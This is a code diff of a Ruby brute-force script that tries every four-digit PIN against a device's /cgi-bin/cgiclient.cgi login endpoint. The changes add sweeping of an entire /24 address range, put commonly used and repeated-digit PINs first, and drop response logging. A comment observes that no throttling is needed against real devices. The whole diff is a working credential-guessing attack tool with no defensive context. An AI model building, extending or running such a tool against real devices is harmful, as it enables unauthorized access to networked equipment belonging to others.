@@ -17,12 +17,12 @@ def get_request(uri, pin)
   request['Referer']         = sprintf('http://%s/login', uri.host)
   request['User-Agent']      = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'
 
-  # TODO saying there is a cookie set, but we're def not authed.. do we need to rotate this to avoid rate limiting?
+  # TODO determine necessity of this, given fuzzing, it's probably unnecessary
   request['Cookie'] = sprintf('_ga=GA1.4.595462255.%s', Time.now.to_i)
 
   body = Array.new
 
-  body << '-----------------------------7da24f2e50046' # TODO is this a magic number or randomly generated? or?
+  body << '-----------------------------7da24f2e50046' # this is a magic number: https://stackoverflow.com/questions/37701805/ie11-content-type-false-in-ie11-it-doesnt-work
   body << 'Content-Disposition: form-data; name="file"; filename="temp.txt"' # TODO should look into what happens when we point at a different file..
   body << 'Content-type: plain/text'
   body << '' # newline
@@ -52,31 +52,57 @@ responses = Array.new
 output    = sprintf('%s-logs-%s.%s.%s.json', __FILE__, address, Time.now.to_i, $$)
 
 if address.nil?
-  puts sprintf('usage: %s <address>', __FILE__)
+  puts sprintf('usage: %s <ipaddress/range>', __FILE__)
+  puts sprintf('  %s 192.168.1.42', __FILE__)
+  puts sprintf('  %s 192.168.1.*', __FILE__)
   exit 1
 end
 
-1.upto(254) do |octet|
-base = $1 if address.match(/((?:\d{1,3}){3}\.)/)
-ip = sprintf('%s.%s', base, octet)
-  9999.downto(0) do |i|
-    # TODO we should prioritize 0000, 1234, etc
+mode = address.match(/^(?:\d{1,3}){3}\.\d{1,3}$/) ? :ip : :range
+targets = Array.new
+
+if mode.eql?(:ip)
+  targets << address
+elsif mode.eql?(:range)
+  base = address.split('.')[0..2].join('.')
+  1.upto(254) do |octet|
+    targets << sprintf('%s.%s', base, octet)
+  end
+end
+
+pins = 9999.downto(0).to_a
+prioritized = [1234, 2546, 1739, 9876, 1425, 4152] # commonly used PINs
+
+# commonly used PINs that follow a pattern
+0.upto(9) do |i|
+  prioritized << i * 1111
+end
+
+prioritized.each do |p|
+  pins.delete(p)
+  pins.unshift(p)
+end
+
+targets.each do |target|
+
+  pins.each do |i|
 
     pin = sprintf('%04d', i)
 
     begin
-      url = sprintf('http://%s/cgi-bin/cgiclient.cgi?CGI.RequestProperties=', address)
-
+      url = sprintf('http://%s/cgi-bin/cgiclient.cgi?CGI.RequestProperties=', target)
       puts sprintf('trying pin[%s]', pin)
 
       response = check_pin(url, pin)
-
       responses << response
+
+      # <properties sys.validate-password="0"></properties>
       if response.body.match(/1/)
         puts sprintf('INFO: found the pin[%s]', pin)
         break
       end
 
+      # this was necessary when testing against a local server, but not against real devices
       #sleep 1 if (i % 100).eql?(0)
 
     rescue => e
@@ -85,30 +111,6 @@ ip = sprintf('%s.%s', base, octet)
     end
 
   end
-end
-
-
-# marshalling the data, at least until we know what we're looking for
-begin
-
-  content = Array.new
-  responses.each do |response|
-    hash = {
-      :code => response.code,
-      :body => response.body,
-      :size => response.body.size,
-    }
-
-    content << hash
-  end
-
-  File.open(output, 'w') do |fh|
-    fh.print(JSON.pretty_generate(content))
-  end
-
-  puts sprintf('SUCCESS: wrote output to[%s]', output)
-rescue => e
-  puts sprintf('ERROR: [%s]: %s[%s]', e.message, "\n", e.backtrace.join("\n"))
 end
 
 # TODO something better here
